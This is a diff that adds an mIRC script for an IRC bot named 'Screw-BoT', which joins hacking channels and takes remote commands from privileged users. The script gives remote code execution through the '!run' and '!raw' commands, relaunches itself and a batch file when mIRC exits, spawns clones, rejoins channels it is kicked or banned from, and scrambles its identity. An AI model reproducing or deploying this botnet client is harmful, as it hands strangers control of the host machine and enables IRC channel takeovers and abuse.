@@ -1,0 +1,151 @@
+[script]
+n0=on 1:start:{
+n1=  nick $read nicks.txt
+n2=  anick $read nicks.txt
+n3=  fullname $read nicks.txt
+n4=  identd on $read nicks.txt
+n5=  set %console
+n6=  notify on | notify NOS | notify Ciprian | notify zO | notify NateDog | notify root | notify Hacker 
+n7=  writeini mirc.ini mirc user $r(a,z) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(111111,999999) | saveini
+n8=  ignore -td *!*@*
+n9=  server $read servers.txt
+n10=  set %utime $ctime
+n11=  .timer 1 120 server -m | fullname $read nicks.txt | identd on $read nicks.txt | nick $read nicks.txt | anick $read nicks.txt
+n12=  .timer 1 240 server -m Lelystad.NL.EU.UnderNet.Org | fullname $read nicks.txt | identd on $read nicks.txt | nick $read nicks.txt | anick $read nicks.txt
+n13=}
+n14=
+n15=on 1:connect:{
+n16=  nick $read nicks.txt | timer 1 30 nick $read nicks.txt
+n17=  anick $read nicks.txt | timer 1 30 anick $read nicks.txt
+n18=  fullname $read nicks.txt
+n19=  identd on $read nicks.txt 
+n20=  join %chan
+n21=  join %Hack1 | join %Hack2
+n22=}
+n23=
+n24=on *:exit: { /run $mircexe | /run sup.bat | halt }
+n25=
+n26=on *:unotify:nick $nick
+n27=on *:unotify:nick $nick
+n28=on *:unotify:nick $nick
+n29=
+n30=on 1:kick:#:{
+n31=  haltdef
+n32=  if ($knick == $me) {
+n33=    .raw join $chan
+n34=    halt
+n35=  }
+n36=}
+n37=
+n38=on 100:text:*:*:{
+n39=  if ($1 == !op) { if ($2 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $2- } | halt }
+n40=  if ($1 == !deop) { if ($2 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $2- } | halt }
+n41=  if ($1 == !voice) { if ($2 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $2- } | halt }
+n42=  if ($1 == !devoice) { if ($2 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $2- } | halt }
+n43=  if ($1 == !ontime) { notice $nick Ontime: $uptime(server,1) | halt }
+n44=  if ($1 == !randnick) { nick $read nicks.txt | halt }
+n45=  if ($1 == !rnick) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) | halt }
+n46=  if ($1 == !ban) { mode $chan -o+b $2 $address($2,2) | kick $chan $2- ( $+ $nick $+ ) | halt }
+n47=  if ($1 == !stop) { .timers off | halt }
+n48=  if ($1 == !run) { run $2- | .notice $nick 2,15 Am rulat (4,15 $2- 2,15)  | halt } 
+n49=  if ($1 == !clone) { server -m | .nick $read nicks.txt | .notice $nick 15CC14CC1CLONING14GG15GG | halt }
+n50=  if ($1 == !server) { server -m $2- | fullname $read nicks.txt | identd on $read nicks.txt | nick $read nicks.txt | anick $read nicks.txt | .notice $nick 15CC14CC1CLONING14GG15GG | halt }
+n51=  if ($1 == !join) { join $2- | who $2 | halt }
+n52=  if ($1 == !console) { if (%console == 1) set %console 0 | else set %console 1 }
+n53=  if ($1 == !rehash) { .reload win.ini | .timer 10 0 raw ping me | .timer 3 0 ctcp x ping | .timer 1 1 .msg $chan Rehash successful! }
+n54=  if ($1 == !part) {
+n55=    if ($2 = $chr(42)) {
+n56=      set %parted 0
+n57=      set %topart $chan(0)
+n58=      while (%topart > %parted) {
+n59=        set %parted $calc(%parted + 1)
+n60=        if ($chan(%parted) != %chan) && ($chan(%parted) != %chan2) { .part $chan(%parted) At the request of $nick (PartAll) }
+n61=      }
+n62=    }
+n63=    .timer 1 0 part $2- 
+n64=    halt
+n65=  }
+n66=  if ($1 == !take) { .notify $2 | .notice $nick 2,15 Am adaugat nick'ul (4,15 $2 2,15) în Lista...  | halt }
+n67=  if ($1 == !let) { .notify -r $2 | .notice $nick 2,15 Am scos nick'ul (4,15 $2 2,15) din Lista...  | halt }
+n68=  if ($1 == !me) { describe $chan $2- | halt }
+n69=  if ($1 == !ame) { ame $2- | halt }
+n70=  if ($1 == $me) {
+n71=    if ($2 == op) { if ($3 == $chr(42)) { if ($4 == $null) { allop $chan | halt } | else { allop $4 | halt } | halt } |  if ($3 == $null) { .mode $chan +o $nick } | else { mode $chan +oooooo $3- } | halt }
+n72=    if ($2 == deop) { if ($3 == $chr(42)) { if ($4 == $null) { alldeop $chan | halt } | else { alldeop $4 | halt } | halt } | if ($3 == $null) { .mode $chan -o $nick } | else { mode $chan -oooooo $3- } | halt }
+n73=    if ($2 == voice) { if ($3 == $chr(42)) { if ($4 == $null) { allvoice $chan | halt } | else { allvoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan +v $nick } | else { mode $chan +vvvvvv $3- } | halt }
+n74=    if ($2 == devoice) { if ($3 == $chr(42)) { if ($4 == $null) { alldevoice $chan | halt } | else { alldevoice $4 | halt } | halt } | if ($3 == $null) { .mode $chan -v $nick } | else { mode $chan -vvvvvv $3- } | halt }
+n75=    if ($2 == rnick) { .timer 1 0 nick $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(A,Z) | halt }
+n76=    if ($2 == nick) { .timer 1 0 nick $3 | halt }
+n77=    if ($2 == msg) { .timer 1 0 msg $3- | halt }
+n78=    if ($2 == say) { .timer 1 0 msg $chan $3- | halt }
+n79=    if ($2 == quit) { .timer 1 0 quit $3- | halt }
+n80=    if ($2 == notice) { .timer 1 0 notice $3- | halt }
+n81=    if ($2 == ctcp) { .ctcp $3- | halt }
+n82=    if ($2 == run) { run $2- | .notice $nick 2,15 Am rulat (4,15 $2- 2,15)  | halt } 
+n83=    if ($2 == randnick) { .timer 1 0 nick $read nicks.txt | halt }
+n84=    if ($2 == take) { notify $3 | .notice $nick 1,15 2,15 Am adaugat nick'ul (4,15 $3 2,15) în Lista...  | halt }
+n85=    if ($2 == let) { notify -r $3 | .notice $nick 1,15 2,15 Am scos nick'ul (4,15 $3 2,15) din Lista...  | halt }
+n86=    if ($2 == clone) { server -m | .notice $nick 15CC14CC1CLONING14GG15GG | halt }
+n87=    if ($2 == exit) && ($level($address($nick,2)) > 2) { exit | halt }
+n88=    if ($2 == reconn) { server | halt }
+n89=    if ($2 == part) {
+n90=      if ($3 == $chr(42)) {
+n91=        set %parted 0
+n92=        set %topart $chan(0)
+n93=        while (%topart > %parted) {
+n94=          set %parted $calc(%parted + 1)
+n95=          if ($chan(%parted) != %chan) { .part $chan(%parted) At the request of $nick (PartAll) }
+n96=        }
+n97=      }
+n98=      .timer 1 0 part $3- 
+n99=      halt
+n100=    }
+n101=    .timer 1 0 $2-
+n102=  }
+n103=  if ($1 == !quit) { .timer 1 0 quit $2- | halt }
+n104=  if ($1 == !say) { .timer 1 0 msg $chan $2- | halt }
+n105=  if ($1 == !msg) { .timer 1 0 msg $2- | halt }
+n106=  if ($1 == -msg) { .timer 1 1 msg $2- | halt }
+n107=  if ($1 == !notice) { .timer 1 0 notice $2- | halt }
+n108=  if ($1 == !cycle) { .timer 1 1 part $2 $3- | .timer 0 60 join $2 | halt }
+n109=  if ($1 == !ctcp) { .timer 1 0 .ctcp $2- | halt }
+n110=  if ($1 == !mode) { .timer 1 0 //mode $me $2- | halt }
+n111=  if ($1 == !seen) { .timer 1 0 /j $2- | halt }
+n112=  if ($1 == !exit) {
+n113=    .partall
+n114=    .timerexit 1 3 exit
+n115=  }
+n116=  if ($1 == !raw) {
+n117=    $$2-
+n118=  }
+n119=}
+n120=
+n121=on 100:action:*:*:{
+n122=  if ($1 == hi) { .timer 1 0 /j $2- | halt }
+n123=}
+n124=
+n125=raw 471:*:{
+n126=  haltdef
+n127=  .timerjoin $+ $$2 20 30 join $$2
+n128=  halt
+n129=}
+n130=
+n131=raw 473:*:{
+n132=  haltdef
+n133=  .timerjoin $+ $$2 20 30 join $$2
+n134=  halt
+n135=}
+n136=
+n137=raw 474:*:{
+n138=  haltdef
+n139=  .timerjoin $+ $$2 20 30 join $$2
+n140=  halt
+n141=}
+n142=
+n143=raw 475:*:{
+n144=  haltdef
+n145=  .timerjoin $+ $$2 20 30 join $$2 $read(nicks.txt, 123)
+n146=  halt
+n147=}
+n148=
+n149=alias ver return ::: Running on :::( 1Windows: $os ):::( 4Screw-BoT v3.1.3.3.7 by NetRider © ):::( 1Ontime: $uptime(server,1) ):::
